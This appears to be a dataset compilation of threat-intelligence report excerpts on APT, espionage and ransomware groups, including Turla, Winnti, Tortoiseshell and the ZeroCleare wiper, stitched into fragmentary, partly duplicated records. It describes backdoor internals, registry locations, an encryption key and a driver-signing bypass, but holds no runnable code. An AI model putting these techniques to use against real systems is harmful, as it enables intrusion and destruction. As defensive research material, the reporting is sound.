These recent ransomware KillDisk variants are not only able to target Windows systems, but also Linux machines, which is certainly something we don’t see every day. This may include not only Linux workstations but also servers, amplifying the damage potential. <https://www.welivesecurity.com/2017/01/05/killdisk-now-targetinglinux-demands-250k-ransom-cant-decrypt/>

(FireEye) The threat group has previously used newsworthy events as lures to deliver malware. They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors. The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China. The threat group’s latest activity coincided with the announcement of criminal charges against democracy activists. During the past 12 months, Chinese authorities have faced several challenges, including large-scale protests in Hong Kong in late 2014, the precipitous decline in the stock market in mid-2015, and the massive industrial explosion in Tianjin in August 2015. In Hong Kong, the pro-democracy movement persists, and the government recently denied a professor a post because of his links to a pro-democracy leader.

Destructive attacks like these have been observed repeatedly over the years and the Windows Defender and Windows Defender Advanced Threat Protection Threat Intelligence teams are working on protection, detection, and response to these threats. Microsoft Threat Intelligence identified similarities between this recent attack and previous 2012 attacks against tens of thousands of computers belonging to organizations in the energy sector. Microsoft Threat Intelligence refers to the activity group behind these attacks as Terbium, following our internal practice of assigning rogue actors chemical element names.

Description

(Symantec) Perhaps the most worrying discovery we made was that Thrip had targeted a satellite communications operator. The attack group seemed to be particularly interested in the operational side of the company, looking for and infecting computers running software that monitors and controls satellites. This suggests to us that Thrip’s motives go beyond spying and may also include disruption. Another target was an organization involved in geospatial imaging and mapping. Again, Thrip seemed to be mainly interested in the operational side of the company. It targeted computers running MapXtreme Geographic Information System (GIS) software which is used for tasks such as developing custom geospatial applications or integrating location-based data into other applications. It also targeted machines running Google Earth Server and Garmin imaging software. The satellite operator wasn’t the only communications target Thrip was interested in. The group had also targeted three different telecoms operators, all based in Southeast Asia. In all cases, based on the nature of the computers infected by Thrip, it appeared that the telecoms companies themselves and not their customers were the targets of these attacks. In addition, there was a fourth target of interest, a defense contractor.

(Proofpoint) Proofpoint researchers recently uncovered evidence of an advanced persistent threat (APT) against Indian diplomatic and military resources. Our investigation began with malicious emails sent to Indian embassies in Saudi Arabia and Kazakstan but turned up connections to watering hole sites focused on Indian military personnel and designed to drop a remote access Trojan (RAT) with a variety of data exfiltration functions. Our analysis shows that many of the campaigns and attacks appear related by common IOCs, vectors, payloads, and language, but the exact nature and attribution associated with this APT remain under investigation. At this time, the background and analysis in this paper provide useful forensics and detail our current thinking on the malware that we have dubbed “MSIL/Crimson”.

Operation “Satellite Turla” Obviously, such incredibly apparent and large-scale attacks have little chance of surviving for long periods of time, which is one of the key requirements for running an APT operation. It is therefore not very feasible to perform the attack through MitM traffic hijacking, unless the attackers have direct control over some high-traffic network points, such as backbone routers or fiber optics. There are signs that such attacks are becoming more common, but there is a much simpler way to hijack satellite-based Internet traffic. <https://securelist.com/satellite-turla-apt-command-and-control-in-thesky/72081/>

Operation “WITCHCOVEN” When an unsuspecting user visits any of the over 100 compromised websites, a small piece of inserted code—embedded in the site’s HTML and invisible to casual visitors—quietly redirects the user’s browser to a second compromised website without the user’s knowledge. This second website hosts the WITCHCOVEN script, which uses profiling techniques to collect technical information on the user’s computer.

Some of the tactics used in APT attacks die hard. A good example is provided by Turla’s watering hole campaigns. Turla, which has been targeting governments, government officials and diplomats for years – see, as an example, this recent paper – is still using watering hole techniques to redirect potentially interesting victims to their C&C infrastructure. In fact, they have been using them since at least 2014 with very few variations in their modus operandi. <https://www.welivesecurity.com/2017/06/06/turlas-watering-holecampaign-updated-firefox-extension-abusing-instagram/>

Starting in March 2018, we observed a significant change in the campaign: it now leverages the open source exploitation framework Metasploit before dropping the custom Mosquito backdoor. <https://www.welivesecurity.com/2018/05/22/turla-mosquito-shifttowards-generic-tools/>

"2018

Much of our 2018 research focused on Turla’s KopiLuwak javascript backdoor, new variants of the Carbon framework and meterpreter delivery techniques. Also interesting was Mosquito’s changing delivery techniques, customized PoshSec-Mod open-source powershell use, and borrowed injector code. We tied some of this activity together with infrastructure and data points from WhiteBear and Mosquito infrastructure and activity in 2017 and 2018. <https://securelist.com/shedding-skin-turlas-fresh-faces/88069/>

Turla, also known as Snake, is an infamous espionage group recognized for its complex malware. To confound detection, its operators recently started using PowerShell scripts that provide direct, in-memory loading and execution of malware executables and libraries. This allows them to bypass detection that can trigger when a malicious executable is dropped on disk. <https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/>

Description

(Check Point) Beginning in late 2012, the carefully orchestrated attack campaign we call Volatile Cedar has been targeting individuals, companies and institutions worldwide. This campaign, led by a persistent attacker group, has successfully penetrated a large number of targets using various attack techniques, and specifically, a custom-made malware implant codenamed Explosive. This report provides an extended technical analysis of Volatile Cedar and the Explosive malware. We have seen clear evidence that Volatile Cedar has been active for almost 3 years. While many of the technical aspects of the threat are not considered “cutting edge”, the campaign has been continually and successfully operational throughout this entire timeline, evading detection by the majority of AV products. This success is due to a well-planned and carefully managed operation that constantly monitors its victims’ actions and rapidly responds to detection incidents.

(CrowdStrike) Winnti Group, Blackfly, Wicked Panda refers to the targeted intrusion operations of the actor publicly known as “Winnti,” whereas Wicked Spider represents this group’s financially-motivated criminal activity. Originally, Wicked Spider was observed exploiting a number of gaming companies and stealing codesigning certificates for use in other operations associated with the malware known as Winnti. Now, Winnti is commonly associated with the interests of the government of the People’s Republic of China (PRC). Wicked Spider has been observed targeting technology companies in Germany, Indonesia, the Russian Federation, South Korea, Sweden, Thailand, Turkey, the United States, and elsewhere. Notably, Wicked Spider has often targeted gaming companies for their certificates, which can be used in future PRC-based operations to sign malware. Ongoing analysis is still evaluating how these certificates are used — whether Wicked Spider hands the certificates off to other adversaries for use in future campaigns or stockpiles them for its own use.

Information theft and espionage

Description

(Symantec) A corporate espionage group has compromised a string of major corporations over the past three years in order to steal confidential information and intellectual property. The gang, which Symantec calls Butterfly, is not-state sponsored, rather financially motivated. It has attacked multi-billion dollar companies operating in the internet, IT software, pharmaceutical, and commodities sectors. Twitter, Facebook, Apple, and Microsoft are among the companies who have publicly acknowledged attacks. Butterfly is technically proficient and well resourced. The group has developed a suite of custom malware tools capable of attacking both Windows and Apple computers, and appears to have used at least one zero-day vulnerability in its attacks. It keeps a low profile and maintains good operational security. After successfully compromising a target organization, it cleans up after itself before moving on to its next target. This group operates at a much higher level than the average cybercrime gang. It is not interested in stealing credit card details or customer databases and is instead focused on high-level corporate information. Butterfly may be selling this information to the highest bidder or may be operating as hackers for hire. Stolen information could also be used for insider-trading purposes.

Information theft and espionage

Description

Winnti Group is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting. Some reporting suggests a number of other groups, including Axiom, Group 72, APT 17, Deputy Dog, and Ke3chang, Vixen Panda, APT 15, GREF, Playful Dragon, are closely linked to Winnti Group. (Trend Micro) The group behind the Winnti malware (which we will call the Winnti group for brevity) sprung up as a band of traditional cyber crooks, comprising black hats whose technical skills were employed to perpetrate financial fraud. Based on the use of domain names they registered, the group started out in the business of fake/rogue anti-virus products in 2007. In 2009, the Winnti group shifted to targeting gaming companies in South Korea using a self-named data- and file-stealing malware. The group, which was primarily motivated by profit, is noted for utilizing selfdeveloped technically-proficient tools for their attacks. They once attacked a game server to illicitly farm in-game currency (“gaming gold”, which also has real-world value) and stole source codes of online game projects. The group also engaged in the theft of digital certificates which they then used to sign their malware to make them stealthier. The Winnti group diversified its targets to include enterprises such as those in pharmaceutics and telecommunications."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|81370f39f637450495ac1e4edae90cb7
"The group has since earned infamy for being involved in malicious activities associated with targeted attacks, such as deploying spear-phishing campaigns and building a backdoor.

In the autumn of 2011, a Trojan was detected on a huge number of computers – all of them linked by the fact that they were used by players of a popular online game. It emerged that the piece of malware landed on users’ computers as part of a regular update from the game’s official update server. Some even suspected that the publisher itself was spying on players. However, it later became clear that the malicious program ended up on the users’ computers by mistake: the cybercriminals were in fact targeting the companies that develop and release computer games. <https://securelist.com/winnti-more-than-just-a-game/37029/>

(ClearSky) Over the last few weeks, several significant leaks regarding a number of Iranian APTs took place. After analyzing and investigating the documents we conclude that they are authentic. Consequently, this causes considerable harm to the groups and their operation. The identity of the actor behind the leak is currently unknown, however based on the scope and the quality of the exposed documents and information, it appears that they are professional and highly capable. This leak will likely hamstring the groups' operation in the near future. Accordingly, in our assessment this will minimize the risk of potential attacks in the next few months and possibly even year. Note -most of the leaks are posted on Telegram channels that were created specifically for this purpose. Below are the three main Telegram groups on which the leaks were posted: 

Description

This actor may be related to Iridium. (AdvIntel) “Achilles” is an English-speaking threat actor primarily operating on various English-language underground hacking forums as well as through secure messengers. Achilles specializes in obtaining accesses to high-value corporate internal networks. On May 4, 2019, Achilles claimed to have access to UNICEF network as well as networks of several high-profile corporate entities. They were able to provide evidence of their presence within the UNICEF network and two private sector companies. It is noteworthy that they provided access to networks at a relatively low price range of $5,000 USD to $2,000 USD. The majority of Achilles offers are related to breaches into multinational corporate networks via external VPN and compromised RDPs. Targets include private companies and government organizations, primarily in the British Commonwealth. Achilles has been particularly active on forums through the last seven months, with rising spikes in activities in Fall 2018 and Spring 2019.

(ZDNet) The hacker said that he put up the data for sale mainly because these companies had failed to protect passwords with strong encryption algorithms like bcrypt. Most of the hashed passwords the hacker put up for sale today can cracked with various levels of difficulty --but they can be cracked. ""I got upset because I feel no one is learning,"" the hacker told ZDNet in an online chat earlier today. ""I just felt upset at this particular moment, because seeing this lack of security in 2019 is making me angry."" In a conversation with ZDNet last month, the hacker told us he wanted to hack and put up for sale more than one billion records and then retire and disappear with the money. But in a conversation today, the hacker says this is not his target anymore, as he learned that other hackers have already achieved the same goal before him. Gnosticplayers also revealed that not all the data he obtained from hacked companies had been put up for sale. Some companies gave into extortion demands and paid fees so breaches would remain private. ""I came to an agreement with some companies, but the concerned startups won't see their data for sale,"" he said. ""I did it that's why I can't publish the rest of my databases or even name them.""

Description

(SecureWorks) In late 2015, Secureworks Counter Threat Unit (CTU) researchers began tracking financially motivated campaigns leveraging SamSam ransomware (also known as Samas and SamsamCrypt). CTU researchers associate this activity with the Gold Lowell threat group. Gold Lowell typically scans for and exploits known vulnerabilities in Internet-facing systems to gain an initial foothold in a victim’s network. The threat actors then deploy the SamSam ransomware and demand payment to decrypt the victim’s files. The consistent tools and behaviors associated with SamSam intrusions since 2015 suggest that Gold Lowell is either a defined group or a collection of closely affiliated threat actors. Applying security updates in a timely manner and regularly monitoring for anomalous behaviors on Internet-facing systems are effective defenses against these tactics. Organizations should also create and test response plans for ransomware incidents and use backup solutions that are resilient to corruption or encryption attempts.

Grim Spider is reportedly associated with Lunar Spider and Wizard Spider. (CrowdStrike) Grim Spider is a sophisticated eCrime group that has been operating the Ryuk ransomware since August 2018, targeting large organizations for a highransom return. This methodology, known as “big game hunting,” signals a shift in operations for Wizard Spider, a criminal enterprise of which Grim Spider appears to be a cell. The Wizard Spider threat group, known as the Russia-based operator of the TrickBot banking malware, had focused primarily on wire fraud in the past. Similar to Samas and BitPaymer, Ryuk is specifically used to target enterprise environments. Code comparison between versions of Ryuk and Hermes ransomware indicates that Ryuk was derived from the Hermes source code and has been under steady development since its release. Hermes is commodity ransomware that has been observed for sale on forums and used by multiple threat actors. However, Ryuk is only used by Grim Spider and, unlike Hermes, Ryuk has only been used to target enterprise environments. Since Ryuk’s appearance in August, the threat actors operating it have netted over 705.80 BTC across 52 transactions for a total current value of $3,701,893.98 USD.

Description

The many 0-days that had been collected by Hacking Team and which became publicly available during the breach of their organization in 2015, have been used by several APT groups since. (ESET) Since being founded in 2003, the Italian spyware vendor Hacking Team gained notoriety for selling surveillance tools to governments and their agencies across the world. The capabilities of its flagship product, the Remote Control System (RCS), include extracting files from a targeted device, intercepting emails and instant messaging, as well as remotely activating a device’s webcam and microphone. The company has been criticized for selling these capabilities to authoritarian governments – an allegation it has consistently denied. When the tables turned in July 2015, with Hacking Team itself suffering a damaging hack, the reported use of RCS by oppressive regimes was confirmed. With 400GB of internal data – including the once-secret list of customers, internal communications, and spyware source code – leaked online, Hacking Team was forced to request its customers to suspend all use of RCS, and was left facing an uncertain future. Following the hack, the security community has been keeping a close eye on the company’s efforts to get back on its feet. The first reports suggesting Hacking Team’s resumed operations came six months later – a new sample of Hacking Team’s Mac spyware was apparently in the wild."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|f910c79bd9c5406190200ebde88574d2
"A year after the breach, an investment by a company named Tablem Limited brought changes to Hacking Team’s shareholder structure, with Tablem Limited taking 20% of Hacking Team’s shareholding. Tablem Limited is officially based in Cyprus; however, recent news suggests it has ties to Saudi Arabia.

(CrowdStrike) Indrik Spider is a sophisticated eCrime group that has been operating Dridex since June 2014. In 2015 and 2016, Dridex was one of the most prolific eCrime banking trojans on the market and, since 2014, those efforts are thought to have netted Indrik Spider millions of dollars in criminal profits. Throughout its years of operation, Dridex has received multiple updates with new modules developed and new anti-analysis features added to the malware. In August 2017, a new ransomware variant identified as BitPaymer was reported to have ransomed the U.K.’s National Health Service (NHS), with a high ransom demand of 53 BTC (approximately $200,000 USD). The targeting of an organization rather than individuals, and the high ransom demands, made BitPaymer stand out from other contemporary ransomware at the time. Though the encryption and ransom functionality of BitPaymer was not technically sophisticated, the malware contained multiple anti-analysis features that overlapped with Dridex. Later technical analysis of BitPaymer indicated that it had been developed by Indrik Spider, suggesting the group had expanded its criminal operation to include ransomware as a monetization strategy.

Description

(Crowdstrike) Mummy Spider is a criminal entity linked to the core development of the malware most commonly known as Emotet or Geodo. First observed in mid2014, this malware shared code with the Bugat (aka Feodo) banking Trojan. However, Mummy Spider swiftly developed the malware’s capabilities to include an RSA key exchange for command and control (C2) communication and a modular architecture. Mummy Spider does not follow typical criminal behavioral patterns. In particular, Mummy Spider usually conducts attacks for a few months before ceasing operations for a period of between three and 12 months, before returning with a new variant or version. After a 10 month hiatus, Mummy Spider returned Emotet to operation in December 2016 but the latest variant is not deploying a banking Trojan module with web injects, it is currently acting as a ‘loader’ delivering other malware packages. The primary modules perform reconnaissance on victim machines, drop freeware tools for credential collection from web browsers and mail clients and a spam plugin for self-propagation. The malware is also issuing commands to download and execute other malware families such as the banking Trojans Dridex and Qakbot. Mummy Spider advertised Emotet on underground forums until 2015, at which time it became private. Therefore, it is highly likely that Emotet is operated solely for use by Mummy Spider or with a small trusted group of customers."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|b4d536858fe74e2abf88f7a0692eecc0

(Palo Alto) In December 2018, Palo Alto Networks Unit 42 researchers identified an ongoing campaign with a strong focus on the hospitality sector, specifically on hotel reservations. Although our initial analysis didn’t show any novel or advanced techniques, we did observe strong persistence during the campaign that triggered our curiosity. We followed network traces and pivoted on the information left behind by this actor, such as open directories, document metadata, and binary peculiarities, which enabled us to find a custom-made piece of malware, that we named “CapturaTela”. Our discovery of this malware family shows the reason for the persistent focus on hotel reservations as a primary vector: stealing credit card information from customers. We profiled this threat actor and that has resulted in uncovering not only their delivery mechanisms, but also their arsenal of remote access tools and info-stealing trojans, both acquired from underground forums as well as open source tools found in GitHub repositories.

Known for hijacking prominent social media accounts, the self-styled white hat hacking group OurMine took over a number of verified Twitter and Facebook accounts belonging to the cable network. These include accounts for HBO shows, such as “Game of Thrones,” “Girls,” and “Ballers.” This is not the first time that OurMine has claimed responsibility for hacking highprofile social networking accounts. Last year, the group victimized Marvel, The New York Times, and even the heads of some of the biggest technology companies in the world. Mark Zuckerberg, Jack Dorsey, Sundar Pichai, and Daniel Ek — the CEOs of Facebook, Twitter, Google and Spotify, respectively — have also fallen victim to the hackers, dispelling the notion that a career in software and technology exempts one from being compromised.

(CrowdStrike) CrowdStrike Intelligence has recently observed Pinchy Spider affiliates deploying GandCrab ransomware in enterprise environments, using lateral movement techniques and tooling commonly associated with nation-state adversary groups and penetration testing teams. This change in tactics makes Pinchy Spider and its affiliates the latest eCrime adversaries to join the growing trend of targeted, low-volume/high-return ransomware deployments known as “big game hunting.” Pinchy Spider is the criminal group behind the development of the ransomware most commonly known as GandCrab, which has been active since January 2018. Pinchy Spider sells access to use GandCrab ransomware under a partnership program with a limited number of accounts. The program is operated with a 60-40 split in profits (60 percent to the customer), as is common among eCrime actors, but Pinchy Spider is also willing to negotiate up to a 70-30 split for “sophisticated” customers.

Description

An unnamed source leaked almost 10,000 documents describing a large number of 0-day vulnerabilities, methodologies and tools that had been collected by the CIA, such as, specifically, the group known as Longhorn, The Lamberts. This leaking was done through WikiLeaks, since March 2017. In weekly publications, the dumps were said to come from Vault 7 and later Vault 8, until his arrest in 2018. Most of the published vulnerabilities have since been fixed by the respective vendors, but many have been used by other threat actors. This actor turned out to be a former CIA software engineer. (WikiLeaks) Today, Tuesday 7 March 2017, WikiLeaks begins its new series of leaks on the U.S. Central Intelligence Agency. Code-named ""Vault 7"" by WikiLeaks, it is the largest ever publication of confidential documents on the agency. The first full part of the series, ""Year Zero"", comprises 8,761 documents and files from an isolated, high-security network situated inside the CIA's Center for Cyber Intelligence in Langley, Virgina. It follows an introductory disclosure last month of CIA targeting French political parties and candidates in the lead up to the 2012 presidential election. Recently, the CIA lost control of the majority of its hacking arsenal including malware, viruses, trojans, weaponized ""zero day"" exploits, malware remote control systems and associated documentation."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|c19f240c62cb4895a3733defd0fc49c0
"This extraordinary collection, which amounts to more than several hundred million lines of code, gives its possessor the entire hacking capacity of the CIA. The archive appears to have been circulated among former U.S. government hackers and contractors in an unauthorized manner, one of whom has provided WikiLeaks with portions of the archive. ""Year Zero"" introduces the scope and direction of the CIA's global covert hacking program, its malware arsenal and dozens of ""zero day"" weaponized exploits against a wide range of U.S. and European company products, include Apple's iPhone, Google's Android and Microsoft's Windows and even Samsung TVs, which are turned into covert microphones.

"Tortoiseshell Group Targets IT Providers in Saudi Arabia in Probable Supply Chain Attacks symantec.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain

A previously undocumented attack group is using both custom and off-the-shelf malware to target IT providers in Saudi Arabia in what appear to be supply chain attacks with the end goal of compromising the IT providers’ customers. The group, which we are calling Tortoiseshell, has been active since at least July 2018. Symantec has identified a total of 11 organizations hit by the group, the majority of which are based in Saudi Arabia. In at least two organizations, evidence suggests that the attackers gained domain admin-level access. ""#Tortoiseshell group uses custom malware, off-the-shelf tools, #livingofftheland techniques to compromise victims https://symc.ly/2lV4Ovn"" Another notable element of this attack is that, on two of the compromised networks, several hundred computers were infected with malware. This is an unusually large number of computers to be compromised in a targeted attack. It is possible that the attackers were forced to infect many machines before finding those that were of most interest to them. We have seen Tortoiseshell activity as recently as July 2019.

"Custom tools

1/5

The unique component used by Tortoiseshell is a malware called Backdoor.Syskit. This is a basic backdoor that can download and execute additional tools and commands. The actors behind it have developed it in both Delphi and .NET. Backdoor.Syskit is run with the “-install” parameter to install itself. There are a number of minor variations of the backdoor, but the primary functionality is the following: reads config file: %Windir%\temp\rconfig.xml writes Base64 encoding of AES encrypted (with key ""fromhere"") version of the data in the ""url"" element of the XML to: HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\policies\system\Enablevmd This contains the command and control (C&C) information. writes Base64 encoding of AES encrypted (with key ""fromhere"") version of the ""result"" element of the XML to: HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\policies\system\Sendvmd This holds the later portion of the URL to append to the C&C for sending information to it. deletes the config file The malware collects and sends the machine’s IP address, operating system name and version, and Mac address to the C&C server using the URL in the Sendvmd registry key mentioned above. Data sent to the C&C server is Base64 encoded."|data_input/Oilrig_reports/entry_76c57c8d-41fe-4040-8616-ca3e4a2e6a41.text|5d503cfd397748df83a3a58dfe0a7f78
"The backdoor can receive various commands: ""kill_me"": stops the dllhost service and deletes %Windir%\temp\bak.exe ""upload "" downloads from the URL provided by the C&C server ""unzip"" uses PowerShell to unzip a specified file to a specified destination, or to run cmd.exe /c <received command>

Tools, techniques, and procedures The other tools used by the group are public tools, and include: Infostealer/Sha.exe/Sha432.exe Infostealer/stereoversioncontrol.exe get-logon-history.ps1 2/5

Infostealer/stereoversioncontrol.exe downloads a RAR file, as well as the get-logonhistory.ps1 tool. It runs several commands on the infected machine to gather information about it and also the Firefox data of all users of the machine. It then compresses this information before transferring it to a remote directory. Infostealer/Sha.exe/Sha432.exe operates in a similar manner, gathering information about the infected machine. We also saw Tortoiseshell using other dumping tools and PowerShell backdoors. The initial infection vector used by Tortoiseshell to get onto infected machines has not been confirmed, but it is possible that, in one instance, a web server was compromised to gain access by the attacker. For at least one victim, the first indication of malware on their network was a web shell (d9ac9c950e5495c9005b04843a40f01fa49d5fd49226cb5b03a055232ffc36f3). This indicates that the attackers likely compromised a web server, and then used this to deploy malware onto the network."|data_input/Oilrig_reports/entry_76c57c8d-41fe-4040-8616-ca3e4a2e6a41.text|3ab7f71066f54da0bda69e4480eaa5a3
This activity indicates the attackers had achieved domain admin level access on these networks, meaning they had access to all machines on the network. Once on a victim computer, Tortoiseshell deploys several information gathering tools, like those mentioned above, and retrieves a range of information about the machine, such as IP configuration, running applications, system information, network connectivity etc. On at least two victim networks, Tortoiseshell deployed its information gathering tools to the Netlogon folder on a domain controller. This results in the information gathering tools being executed automatically when a client computer logs into the domain. This activity indicates the attackers had achieved domain admin level access on these networks, meaning they had access to all machines on the network.|data_input/Oilrig_reports/entry_76c57c8d-41fe-4040-8616-ca3e4a2e6a41.text|d6a4612ded8e46a780fb029633914f6d
Presence of OilRig tools In one victim organization, we also saw a tool called Poison Frog deployed one month prior to the Tortoiseshell tools. Poison Frog is a backdoor and a variant of a tool called BondUpdater, which was previously seen used in attacks on organizations in the Middle East. The tools were leaked on Telegram in April this year and are associated with the group known as APT34, aka Oilrig. It is unclear if the same actor deployed both the Poison Frog tool and the Tortoiseshell tools, however, given the gap in time between the two sets of tools being used, and without further evidence, the current assumption is that the activity is unrelated. If that is the case, this activity demonstrates the interest from multiple attack groups in industries in this region. The Poison Frog tool also appears to have been leaked prior to deployment to this victim, so could be used by a group unrelated to APT34/Oilrig. 3/5|data_input/Oilrig_reports/entry_76c57c8d-41fe-4040-8616-ca3e4a2e6a41.text|11ac67b8dc794079bb107d1a96af0ffb
Attacker motives The targeting of IT providers points strongly to these attacks being supply chain attacks, with the likely end goal being to gain access to the networks of some of the IT providers’ customers. Supply chain attacks have been increasing in recent years, with a 78 percent increase in 2018, as we covered in ISTR 24. Supply chain attacks, which exploit third-party services and software to compromise a final target, take many forms, including hijacking software updates and injecting malicious code into legitimate software. IT providers are an ideal target for attackers given their high level of access to their clients’ computers. This access may give them the ability to send malicious software updates to target machines, and may even provide them with remote access to customer machines. This provides access to the victims’ networks without having to compromise the networks themselves, which might not be possible if the intended victims have strong security infrastructure, and also reduces the risk of the attack being discovered. The targeting of a third-party service provider also makes it harder to pinpoint who the attackers’ true intended targets were. The customer profiles of the targeted IT companies are unknown, but Tortoiseshell is not the first group to target organizations in the Middle East, as we have covered in previous blogs.|data_input/Oilrig_reports/entry_76c57c8d-41fe-4040-8616-ca3e4a2e6a41.text|558690b44dab492eb4f2b8108867c8ee
"However, we currently have no evidence that would allow us to attribute Tortoiseshell’s activity to any existing known group or nation state.

New Malware “ZeroCleare” Used in Destructive Attacks IBM® X-Force® has been researching and tracking destructive malware in the Middle East, particularly in the industrial and energy sector. Since the first Shamoon attacks that started affecting organizations in the region in summer of 2012, we have been following the evolution of destructive, disk-wiping malware deployed to cause disruption. In recent analysis, X-Force Incident Response and Intelligence Services (IRIS) discovered new malware from the Wiper class, used in a destructive attack in the Middle East. We named this malware “ZeroCleare” per the program database (PDB) pathname of its binary file. According to our analysis, ZeroCleare was used to execute a destructive attack that affected organizations in the energy and industrial sectors in the Middle East. Based on the analysis of the malware and the attackers’ behavior, we suspect Iran-based nation state adversaries were involved to develop and deploy this new wiper. Given the evolution of destructive malware targeting organizations in the region, we were not surprised to find that ZeroCleare bears some similarity to the Shamoon malware. Taking a page out of the Shamoon playbook, ZeroCleare aims to overwrite the Master Boot Record (MBR) and disk partitions on Windows-based machines. As Shamoon did before it, the tool of choice in the attacks is EldoS RawDisk, a legitimate toolkit for interacting with files, disks, and partitions.|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|173207a97848412fb2eac1d9f228fcdb
"Nation-state groups and cyber criminals frequently use legitimate tools in ways that a vendor did not intend to accomplish malicious or destructive activity. Using RawDisk with malicious intent enabled ZeroCleare’s operators to wipe the MBR and damage disk partitions on a large number of networked devices. To gain access to the device’s core, ZeroCleare used an intentionally vulnerable driver and malicious PowerShell/Batch scripts to bypass Windows controls. Adding these ‘living off the land’ tactics to the scheme, ZeroCleare was spread to numerous devices on the affected network, sowing the seeds of a destructive attack that could affect thousands of devices and cause disruption that could take months to fully recover from. These tactics resemble the way Shamoon was launched in attacks on Arabian Gulf targets in 2018. X-Force IRIS assesses that the ITG13 threat group, also known as APT34/OilRig, and at least one other group, likely based out of Iran, collaborated on the destructive portion of the attack. X-Force IRIS’s assessment is based on ITG13's traditional mission, which has not included executing destructive cyber-attacks in the past, the gap in time between the initial access facilitated by ITG13 and the last stage of the intrusion, as well as the different TTPs our team observed. To date, X-Force IRIS has not found any previous reporting on the ""ZeroCleare"" wiper, its indicators, or elements observed in this campaign."|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|0b8cd20772e74d019141fecf9f7d0385

1.1 Destructive Attacks – A Rising Concern X-Force IRIS has been following a marked increase in destructive attacks in the past year, having logged a whopping 200 percent increase in the amount of destructive attacks that our team has helped companies respond to over the past six months (comparing IBM incident response activities in the first half of 2019 versus the second half of 2018). Destructive attacks on the energy and industrial sectors have been a rising concern, especially in countries where the economy relies on oil and gas industries, like in some parts of the Middle East and Europe. While we have seen them more frequently in the Middle East, these attacks are not limited to any part of the world and can be launched by any offensive nationstate group seeking to adversely affect the economy of rival countries, or by cybercriminals that use destruction as a pressure tactic. Overall, destructive attacks we have been seeing affect organizations are being carried out by threat actors of varying motivations who could be employing destructive components in their attacks. Some pressure victims to pay them, others counterblow when they are not paid. When these attacks are carried out by nation state adversaries, they often have military objectives that can include accessing systems to deny access to, degrade, disrupt, deceive, or destroy the device/data.|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|134f9e3093db40dca8cc1bc7d50ea923
1.2 ZeroCleare’s General Infection Flow The ZeroCleare wiper is part of the final stage of the overall attack. It is designed to deploy two different ways adapted to 32-bit and 64-bit systems. The general flow of events on 64-bit machines includes using a vulnerable, signed driver and then exploiting it on the target device to allow ZeroCleare to bypass the Windows hardware abstraction layer and avoid some operating system safeguards that prevent unsigned drivers from running on 64-bit machines. This workaround has likely been used because 64-bit Windows based devices are protected with Driver Signature Enforcement (DSE). This control is designed to only allow drivers which have been signed by Microsoft to run on the device. Since ZeroCleare relies on the EldoS RawDisk driver, which is not a signed driver and would therefore not run by default, the attackers use an intermediary file named soy.exe to perform the workaround. They load a vulnerable but signed VBoxDrv driver which the DSE accepts and runs and then exploit it to load the unsigned driver, thereby avoiding DSE rejection of the EldoS driver. Once loaded, the vulnerable VBoxDrv driver is exploited to run shellcode on the kernel level. Post-exploitation, the driver was used to load the unsigned EldoS driver and proceed to the disk wiping phase. Having analyzed soy.exe, we determined it was a modified version of the Turla Driver Loader (TDL) of which purpose is to facilitate that very DSE bypass.|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|901aca263d7846acacb36ac1bbe688cf

The same process does not apply to the 32-bit systems as they do not limit running unsigned drivers in the same manner.

Figure 1: ZeroCleare’s Top Level Infection Flow (Source: IBM X-Force)

1.3 Two ZeroCleare Versions, Only One Worked The ZeroCleare attack is facilitated by a number of files that each fulfill a different role in the infection chain. Files we analyzed are either scripts or executables designed to spread and launch the ZeroCleare malware across the targeted infrastructure. ZeroCleare comes in two versions, one for each Windows architecture (32-bit and 64-bit), but while both exist, only the 64-bit worked. The 32-bit version was supposed to function by installing the EldoS RawDisk driver as a driver service before beginning the wiping process but caused itself to crash when attempting to access the service during the wiping process. Since only the 64-bit version worked, the analysis in this paper will refer to that version.

1.31 Attackers’ File Arsenal The following table lists the files we analyzed as part of what enabled attackers to infect devices with ZeroCleare and spread through compromised networks."|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|183f3c1005694f1a87c3318369874fc3

Table 1: ZeroCleare attacks: malware and supporting files

The following are some overarching notes regarding the file list: -"|data_input/Oilrig_reports/entry_4fc2429d-b51a-4b42-ab83-b5aaa424eb90.text|1bd882d1847b4e10bbdc7225a122b6e4

Table 1: ZeroCleare attacks: malware and supporting files

The following are some overarching notes regarding the file list: -

The PowerShell and batch scripts analyzed were designed to spread and execute the ZeroCleare malware across the domain.

The main PowerShell script, ClientUpdate.ps1 spreads itself to Domain Controllers (DC), and then from those severs. It uses the Active Directory PowerShell module GetADComputer cmdlet to identify lists of target devices to copy and execute the malware on.

The Batch scripts support spreading the malware but work in a more simplistic manner using premade text files that contain hostnames to infect, rather than generating the lists themselves.

We found that the ZeroCleare Wiper’s executable itself, delivered in a file named ClientUpdate.exe, ran with a legitimate license key for EldoS RawDisk driver.

